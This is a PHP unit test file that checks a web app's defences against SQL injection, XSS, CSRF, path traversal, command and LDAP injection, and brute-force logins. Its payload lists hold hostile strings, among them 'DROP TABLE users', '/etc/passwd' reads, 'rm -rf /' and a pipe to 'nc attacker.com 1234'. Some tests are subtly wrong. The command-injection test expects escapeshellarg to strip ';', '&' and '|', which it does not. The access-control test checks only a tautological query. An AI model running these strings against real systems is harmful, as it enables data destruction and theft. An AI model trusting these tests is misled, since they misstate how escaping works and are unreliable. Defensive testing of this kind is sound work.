<?php
/**
 * Comprehensive security vulnerability tests
 * Tests for SQL injection, XSS, CSRF, authentication bypass, and other vulnerabilities
 */

require_once dirname(__DIR__) . '/walletTests/bootstrap.php';
require_once dirname(__DIR__, 2) . '/src/utils/Security.php';
require_once dirname(__DIR__, 2) . '/src/utils/RateLimiter.php';

class ComprehensiveSecurityTest extends TestCase {

    private $pdo;

    public function setUp() {
        parent::setUp();
        $this->pdo = createTestDatabase();
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
    }

    public function tearDown() {
        parent::tearDown();
        if (isset($_SESSION['csrf_token'])) {
            unset($_SESSION['csrf_token']);
        }
    }

    // SQL INJECTION TESTS
    public function testSQLInjectionWithPreparedStatements() {
        $maliciousInputs = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT null, null, null--",
            "admin'--",
            "' OR 1=1--",
            "1; DELETE FROM users WHERE '1'='1",
        ];

        foreach ($maliciousInputs as $input) {
            $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
            $stmt->execute([$input]);
            $result = $stmt->fetchAll();

            // Should return no results (or only valid results), not execute SQL
            $this->assertTrue(is_array($result), "Prepared statement should prevent SQL injection");
        }
    }

    public function testSQLInjectionInNamedParameters() {
        $maliciousUsername = "admin' OR '1'='1";
        $maliciousPassword = "anything' OR '1'='1";

        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
        $stmt->execute([
            ':username' => $maliciousUsername,
            ':password' => $maliciousPassword
        ]);

        $result = $stmt->fetch();
        $this->assertFalse($result, "Should not authenticate with SQL injection");
    }

    public function testSecondOrderSQLInjection() {
        // Store malicious data safely
        $maliciousData = "'; DROP TABLE users; --";
        $stmt = $this->pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
        $stmt->execute([$maliciousData, 'password123']);

        // Retrieve and use it safely
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$maliciousData]);
        $result = $stmt->fetch();

        $this->assertNotNull($result, "Should store and retrieve malicious-looking data safely");

        // Verify table still exists
        $tableCheck = $this->pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
        $this->assertNotNull($tableCheck, "Table should still exist");
    }

    // XSS TESTS
    public function testReflectedXSS() {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)">',
            '"><script>alert(1)</script>',
            '<body onload="alert(1)">',
            '<input onfocus="alert(1)" autofocus>',
        ];

        foreach ($xssPayloads as $payload) {
            $encoded = Security::htmlEncode($payload);

            $this->assertNotContains('<script>', $encoded, "Should encode script tags");
            $this->assertNotContains('javascript:', $encoded, "Should encode javascript protocol");
            $this->assertNotContains('onerror=', $encoded, "Should encode event handlers");
            $this->assertNotContains('onload=', $encoded, "Should encode event handlers");
        }
    }

    public function testStoredXSS() {
        $xssPayload = '<script>alert("Stored XSS")</script>';

        // Store in database
        $stmt = $this->pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
        $stmt->execute([$xssPayload, 'password']);

        // Retrieve and encode for display
        $stmt = $this->pdo->prepare("SELECT username FROM users WHERE password = ?");
        $stmt->execute(['password']);
        $username = $stmt->fetchColumn();

        $safeOutput = Security::htmlEncode($username);

        $this->assertNotContains('<script>', $safeOutput, "Stored data should be encoded when displayed");
        $this->assertContains('&lt;script&gt;', $safeOutput, "Should show encoded tags");
    }

    public function testDOMBasedXSS() {
        // Test encoding for different contexts
        $payload = '"><img src=x onerror=alert(1)>';

        $htmlEncoded = Security::htmlEncode($payload);
        $jsEncoded = Security::jsEncode($payload);
        $urlEncoded = Security::urlEncode($payload);

        $this->assertNotContains('<img', $htmlEncoded, "HTML context should encode tags");
        $this->assertNotContains('">', $jsEncoded, "JS context should encode quotes");
        $this->assertNotContains('<', $urlEncoded, "URL context should encode special chars");
    }

    // CSRF TESTS
    public function testCSRFTokenGeneration() {
        $token1 = Security::generateCSRFToken();
        $token2 = Security::generateCSRFToken();

        $this->assertEquals(64, strlen($token1), "Token should be 64 chars (32 bytes hex)");
        $this->assertEquals($token1, $token2, "Should return same token in same session");
    }

    public function testCSRFTokenValidation() {
        $validToken = Security::generateCSRFToken();

        // Valid token should pass
        $this->assertTrue(Security::validateCSRFToken($validToken), "Valid token should pass");

        // Invalid token should fail
        $this->assertFalse(Security::validateCSRFToken('invalid_token'), "Invalid token should fail");

        // Slightly modified token should fail
        $modifiedToken = substr($validToken, 0, -1) . 'x';
        $this->assertFalse(Security::validateCSRFToken($modifiedToken), "Modified token should fail");
    }

    public function testCSRFTimingAttack() {
        $validToken = Security::generateCSRFToken();
        $attackToken = str_repeat('a', 64);

        // Both should take roughly same time (constant-time comparison)
        $start1 = microtime(true);
        Security::validateCSRFToken($validToken);
        $time1 = microtime(true) - $start1;

        $start2 = microtime(true);
        Security::validateCSRFToken($attackToken);
        $time2 = microtime(true) - $start2;

        // Times should be similar (within order of magnitude)
        $ratio = max($time1, $time2) / min($time1, $time2);
        $this->assertTrue($ratio < 100, "Should use constant-time comparison");
    }

    // AUTHENTICATION BYPASS TESTS
    public function testAuthenticationBypassAttempts() {
        $bypassAttempts = [
            ['username' => "admin' OR '1'='1", 'password' => 'anything'],
            ['username' => "admin'--", 'password' => ''],
            ['username' => "' OR 1=1--", 'password' => ''],
            ['username' => "admin", 'password' => "' OR '1'='1"],
        ];

        foreach ($bypassAttempts as $attempt) {
            $stmt = $this->pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt->execute([$attempt['username'], $attempt['password']]);
            $result = $stmt->fetch();

            $this->assertFalse($result, "Should not bypass authentication with: " . json_encode($attempt));
        }
    }

    // SENSITIVE DATA EXPOSURE TESTS
    public function testPasswordHashingNotPlaintext() {
        $password = "MySecurePassword123!";
        $hash = Security::hashPassword($password);

        $this->assertNotEquals($password, $hash, "Password should be hashed");
        $this->assertTrue(strlen($hash) > 50, "Hash should be substantial length");
        $this->assertTrue(Security::verifyPassword($password, $hash), "Hash should verify");
        $this->assertFalse(Security::verifyPassword('WrongPassword', $hash), "Wrong password should fail");
    }

    public function testSensitiveDataMasking() {
        $sensitiveData = [
            'username' => 'alice',
            'password' => 'secret123',
            'api_key' => 'sk_live_abc123',
            'private_key' => 'BEGIN_PRIVATE_KEY',
            'normal_field' => 'visible_data'
        ];

        $masked = Security::maskSensitiveData($sensitiveData);

        $this->assertEquals('***MASKED***', $masked['password'], "Password should be masked");
        $this->assertEquals('***MASKED***', $masked['api_key'], "API key should be masked");
        $this->assertEquals('***MASKED***', $masked['private_key'], "Private key should be masked");
        $this->assertEquals('alice', $masked['username'], "Username should not be masked");
        $this->assertEquals('visible_data', $masked['normal_field'], "Normal fields should not be masked");
    }

    // INPUT VALIDATION TESTS
    public function testEmailValidation() {
        $validEmails = ['user@example.com', 'test.user@domain.co.uk', 'admin+tag@site.org'];
        $invalidEmails = ['invalid', 'user@', '@domain.com', 'user@domain', 'user space@domain.com'];

        foreach ($validEmails as $email) {
            $this->assertTrue(Security::validateEmail($email), "$email should be valid");
        }

        foreach ($invalidEmails as $email) {
            $this->assertFalse(Security::validateEmail($email), "$email should be invalid");
        }
    }

    public function testURLValidation() {
        $validURLs = ['https://example.com', 'http://site.org/path', 'https://sub.domain.com/page?q=1'];
        $invalidURLs = ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'file:///etc/passwd'];

        foreach ($validURLs as $url) {
            $this->assertTrue(Security::validateUrl($url), "$url should be valid");
        }

        foreach ($invalidURLs as $url) {
            $this->assertFalse(Security::validateUrl($url), "$url should be invalid");
        }
    }

    public function testFilenameTraversalPrevention() {
        $dangerousFilenames = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            'file/../../sensitive.txt',
            '../.../etc/passwd',
            'normal_file.txt/../../../etc/passwd'
        ];

        foreach ($dangerousFilenames as $filename) {
            $safe = Security::sanitizeFilename($filename);

            $this->assertNotContains('..', $safe, "Should remove directory traversal");
            $this->assertNotContains('/', $safe, "Should remove path separators");
            $this->assertNotContains('\\', $safe, "Should remove backslashes");
        }
    }

    // RATE LIMITING TESTS
    public function testBruteForceRateLimiting() {
        $this->pdo->exec("CREATE TABLE IF NOT EXISTS rate_limits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            identifier VARCHAR(255),
            action VARCHAR(100),
            attempts INTEGER,
            first_attempt TIMESTAMP,
            last_attempt TIMESTAMP,
            blocked_until TIMESTAMP
        )");

        $rateLimiter = new RateLimiter($this->pdo);

        // Simulate brute force
        $results = [];
        for ($i = 0; $i < 10; $i++) {
            $result = $rateLimiter->checkLimit('attacker_ip', 'login', 5, 60, 300);
            $results[] = $result;
        }

        // First 5 should be allowed, rest blocked
        for ($i = 0; $i < 5; $i++) {
            $this->assertTrue($results[$i]['allowed'], "Attempt $i should be allowed");
        }
        for ($i = 6; $i < 10; $i++) {
            $this->assertFalse($results[$i]['allowed'], "Attempt $i should be blocked");
        }
    }

    // SESSION SECURITY TESTS
    public function testSessionFixationPrevention() {
        // Session ID should regenerate after login
        $sessionId1 = session_id();
        session_regenerate_id(true);
        $sessionId2 = session_id();

        $this->assertNotEquals($sessionId1, $sessionId2, "Session ID should change after regeneration");
    }

    // INJECTION TESTS
    public function testCommandInjectionPrevention() {
        $maliciousCommands = [
            'test; rm -rf /',
            'test && cat /etc/passwd',
            'test | nc attacker.com 1234',
            'test`whoami`',
            'test$(whoami)',
        ];

        foreach ($maliciousCommands as $cmd) {
            $escaped = escapeshellarg($cmd);

            $this->assertNotContains(';', $escaped, "Should escape semicolons");
            $this->assertNotContains('&', $escaped, "Should escape ampersands");
            $this->assertNotContains('|', $escaped, "Should escape pipes");
            $this->assertNotContains('`', $escaped, "Should escape backticks");
        }
    }

    public function testLDAPInjectionPrevention() {
        $maliciousInputs = [
            'admin*',
            '*)(uid=*',
            '*)(&(objectClass=*',
        ];

        foreach ($maliciousInputs as $input) {
            $escaped = addcslashes($input, ',\\#+<>;="');

            $this->assertNotEquals($input, $escaped, "Should escape LDAP special characters");
        }
    }

    // INFORMATION DISCLOSURE TESTS
    public function testErrorMessageSafety() {
        $exception = new Exception("Database error: Connection to mysql://user:password@localhost:3306 failed");

        $safeMessage = Security::getSafeErrorMessage($exception, false);

        $this->assertNotContains('password', $safeMessage, "Should not expose credentials in errors");
        $this->assertNotContains('mysql://', $safeMessage, "Should not expose connection strings");
        $this->assertEquals("An error occurred. Please try again later.", $safeMessage, "Should use generic message");
    }

    // ACCESS CONTROL TESTS
    public function testDirectObjectReference() {
        // Simulate accessing resources by ID
        $userId = 1;
        $attemptedUserId = 2;

        // Should only access own resources
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ? AND id = ?");
        $stmt->execute([$attemptedUserId, $userId]);
        $result = $stmt->fetch();

        $this->assertFalse($result, "Should not access other user's resources");
    }

    // CRYPTOGRAPHIC TESTS
    public function testSecureRandomGeneration() {
        $token1 = Security::generateSecureToken(32);
        $token2 = Security::generateSecureToken(32);

        $this->assertEquals(64, strlen($token1), "Token should be 64 hex chars");
        $this->assertNotEquals($token1, $token2, "Tokens should be unique");
        $this->assertTrue(ctype_xdigit($token1), "Token should be valid hex");
    }

    public function testPasswordRehashing() {
        $password = "TestPassword123!";
        $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 10]);

        // Simulate algorithm update (e.g., moving to Argon2)
        $needsRehash = password_needs_rehash($hash, PASSWORD_DEFAULT);

        if ($needsRehash) {
            $newHash = Security::hashPassword($password);
            $this->assertTrue(Security::verifyPassword($password, $newHash), "New hash should verify");
        }

        $this->assertTrue(true, "Password rehashing check completed");
    }
}

// Run tests if executed directly
if (!defined('PHPUNIT_RUNNING') || !PHPUNIT_RUNNING) {
    $test = new ComprehensiveSecurityTest();

    SimpleTest::test('SQL injection with prepared statements', function() use ($test) {
        $test->setUp();
        $test->testSQLInjectionWithPreparedStatements();
        $test->tearDown();
    });

    SimpleTest::test('Reflected XSS', function() use ($test) {
        $test->setUp();
        $test->testReflectedXSS();
        $test->tearDown();
    });

    SimpleTest::test('CSRF token generation', function() use ($test) {
        $test->setUp();
        $test->testCSRFTokenGeneration();
        $test->tearDown();
    });

    SimpleTest::test('CSRF token validation', function() use ($test) {
        $test->setUp();
        $test->testCSRFTokenValidation();
        $test->tearDown();
    });

    SimpleTest::test('Authentication bypass attempts', function() use ($test) {
        $test->setUp();
        $test->testAuthenticationBypassAttempts();
        $test->tearDown();
    });

    SimpleTest::test('Password hashing', function() use ($test) {
        $test->setUp();
        $test->testPasswordHashingNotPlaintext();
        $test->tearDown();
    });

    SimpleTest::test('Sensitive data masking', function() use ($test) {
        $test->setUp();
        $test->testSensitiveDataMasking();
        $test->tearDown();
    });

    SimpleTest::test('Email validation', function() use ($test) {
        $test->setUp();
        $test->testEmailValidation();
        $test->tearDown();
    });

    SimpleTest::test('Filename traversal prevention', function() use ($test) {
        $test->setUp();
        $test->testFilenameTraversalPrevention();
        $test->tearDown();
    });

    SimpleTest::test('Brute force rate limiting', function() use ($test) {
        $test->setUp();
        $test->testBruteForceRateLimiting();
        $test->tearDown();
    });

    SimpleTest::run();
}
